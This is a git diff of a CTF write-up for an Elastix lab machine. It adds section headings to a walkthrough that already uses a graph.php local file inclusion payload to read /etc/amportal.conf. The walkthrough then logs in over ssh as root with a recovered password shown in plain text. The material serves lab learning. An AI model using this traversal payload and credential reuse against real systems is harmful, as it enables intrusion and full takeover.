@@ -125,6 +125,7 @@ Finished
 
 
 ## Exploitation
+### 1.Solution:
 + **Elastix 2.2.0 - 'graph.php' Local File Inclusion:** [LFI](https://www.exploit-db.com/exploits/37637)
 + Exploit: `/vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&module=Accounts&action`
 + Navigate to:
@@ -153,8 +154,10 @@ view-source:https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../
 + Login ssh using `root`:`jEhdIekWmdjE`: `ssh root@10.10.10.7`
 + If meet an error, check [1](https://www.iclarified.com/85252/how-to-fix-no-matching-key-exchange-method-found-on-mac) [2](https://askubuntu.com/questions/836048/ssh-returns-no-matching-host-key-type-found-their-offer-ssh-dss)
 + Login `ssh -o KexAlgorithms=diffie-hellman-group14-sha1 -oHostKeyAlgorithms=+ssh-rsa root@10.10.10.7`
++ Get root!
 ![image](https://github.com/h4md153v63n/CTFs/assets/5091265/4cf306f2-3f06-4311-ba44-3fba99817893)
 
+### 2.Solution:
 
 
 
